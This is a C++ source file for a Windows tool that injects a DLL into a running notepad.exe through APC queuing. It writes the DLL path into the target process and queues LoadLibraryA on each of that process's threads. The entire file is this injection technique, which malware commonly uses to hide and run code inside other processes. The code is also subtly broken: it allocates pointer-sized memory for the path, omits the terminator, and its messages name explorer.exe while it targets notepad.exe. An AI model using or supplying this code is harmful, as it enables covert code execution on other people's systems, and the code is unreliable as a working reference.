// APC_Inject.cpp 
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <TlHelp32.h>
#include <wtsapi32.h>

#pragma comment(lib, "wtsapi32")
#define EXECUTABLE L"notepad.exe" //Specify program to inject into here


DWORD findProcess() {
	DWORD explorerpid = 0;
	DWORD plevel = 1; //return an extended struct
	WTS_PROCESS_INFO_EX* wtsp;
	DWORD procCount;
	bool procSuccess = WTSEnumerateProcessesEx(WTS_CURRENT_SERVER_HANDLE, &plevel, WTS_ANY_SESSION, (LPWSTR*) &wtsp, &procCount);
	
	if (procSuccess) {
		for (DWORD i = 0; i < procCount; i++) {
			WTS_PROCESS_INFO_EX *pProc = wtsp + i;
			if (wcscmp(pProc->pProcessName, EXECUTABLE) == 0) {
				explorerpid = pProc->ProcessId;
				break;
			}
		}
	}
	WTSFreeMemoryEx(WTSTypeProcessInfoLevel1, wtsp, procCount);
	return explorerpid;
}

std::vector<DWORD> getProcThreads(DWORD pid) {
	std::vector<DWORD> threadIds; //Threads will be populated here and returned
	
	HANDLE threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
	THREADENTRY32 te;
	te.dwSize = sizeof(te);

	if (!Thread32First(threadSnapshot, &te)) {
		printf("Error: Either no threads exist, or the snapshot provided is faulty.");
		return threadIds;
	}

	do {
		if (te.th32OwnerProcessID == pid) {
			threadIds.push_back(te.th32ThreadID);
		}

	} while (Thread32Next(threadSnapshot, &te));

	CloseHandle(threadSnapshot);
	return threadIds;
}


int main(int argc, char* argv[])
{
	if (argc != 2) {
		printf("Usage: ./APC_Inject.exe <DLL_path>");
		return 1;
	}


	DWORD processId = findProcess();
	if (processId == 0) {
		printf("Couldn't find explorer.exe...\n");
		return 1;
	}

	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId);
	void* memoryBuffer = VirtualAllocEx(hProcess, nullptr, sizeof argv[1], MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(hProcess, memoryBuffer, argv[1], strlen(argv[1]), nullptr);

	std::vector<DWORD> listOfThreads = getProcThreads(processId);

	if (listOfThreads.empty()) {
		printf("No threads found. Exiting...");
		return 1;
	}

	for (int i = 0; i < listOfThreads.size(); i++) {
		HANDLE threadHandle = OpenThread(THREAD_SET_CONTEXT, FALSE, listOfThreads[i]);
		if (threadHandle) { //If there's a handle on the thread
			//You can try NtQueueApcThread instead of QueueUserAPC
			QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryA"), threadHandle, (ULONG_PTR) memoryBuffer);
			CloseHandle(threadHandle);
			Sleep(1000 * 2);
		}
	}

	CloseHandle(hProcess);
	return 0;
}

